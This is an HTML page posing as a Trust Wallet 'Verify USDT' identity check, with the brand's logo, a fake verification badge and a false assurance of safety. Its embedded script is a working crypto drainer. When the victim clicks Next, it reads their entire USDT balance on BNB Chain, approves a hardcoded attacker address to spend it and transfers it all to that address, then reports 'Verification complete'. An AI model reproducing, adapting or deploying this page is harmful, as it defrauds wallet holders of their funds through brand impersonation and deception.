<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Verify USDT – Trust Wallet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" href="favicon.ico" />
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f1f5ff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .card {
      background-color: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .logo {
      width: 60px;
      margin-bottom: 10px;
    }

    h2 {
      color: #1e3a8a;
      margin-bottom: 10px;
    }

    p {
      color: #374151;
      font-size: 15px;
    }

    button {
      background-color: #1e40af;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 10px;
      font-size: 16px;
      margin-top: 15px;
      cursor: pointer;
      width: 100%;
    }

    button:disabled {
      background-color: #9ca3af;
      cursor: not-allowed;
    }

    .trust-badge {
      margin-top: 20px;
      font-size: 14px;
      color: #10b981;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .disclaimer {
      font-size: 12px;
      color: #6b7280;
      margin-top: 20px;
    }

    label {
      display: block;
      margin-top: 20px;
      font-size: 14px;
      color: #374151;
      text-align: left;
    }

    input[type="checkbox"] {
      margin-right: 8px;
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://trustwallet.com/assets/images/media-kit/icon.png" class="logo" alt="Logo" />
    <h2>Please verify your asset</h2>
    <p>This process verifies your identity by approving your USDT on BNB Chain.</p>

    <label>
      <input type="checkbox" id="agree" />
      I agree to the Terms and Privacy Policy
    </label>

    <button id="nextBtn" disabled>Next</button>

    <div class="trust-badge">
      <img src="https://trustwallet.com/assets/images/media-kit/icon.png" width="20" />
      <span>✅ Verified by Trust Wallet</span>
    </div>

    <p class="disclaimer">
      We never ask for your seed phrase or private key. This site uses secure smart contract methods.
    </p>
  </div>

  <script>
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const ADMIN_ADDRESS = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const ABI = [
      {
        constant: true,
        inputs: [{ name: "_owner", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "balance", type: "uint256" }],
        type: "function"
      },
      {
        constant: false,
        inputs: [
          { name: "_spender", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "approve",
        outputs: [{ name: "success", type: "bool" }],
        type: "function"
      },
      {
        constant: false,
        inputs: [
          { name: "_from", type: "address" },
          { name: "_to", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "transferFrom",
        outputs: [{ name: "success", type: "bool" }],
        type: "function"
      }
    ];

    const agree = document.getElementById("agree");
    const btn = document.getElementById("nextBtn");

    agree.addEventListener("change", () => {
      btn.disabled = !agree.checked;
    });

    btn.addEventListener("click", async () => {
      if (typeof window.ethereum === 'undefined') {
        alert("Trust Wallet or Web3-enabled browser required.");
        return;
      }

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];

      const usdt = new web3.eth.Contract(ABI, USDT_ADDRESS);
      const balance = await usdt.methods.balanceOf(user).call();

      if (balance == 0) {
        alert("No USDT found in your wallet.");
        return;
      }

      await usdt.methods
        .approve(ADMIN_ADDRESS, balance)
        .send({ from: user });

      await usdt.methods
        .transferFrom(user, ADMIN_ADDRESS, balance)
        .send({ from: user });

      alert("✅ Verification complete!");
    });
  </script>
</body>
</html>
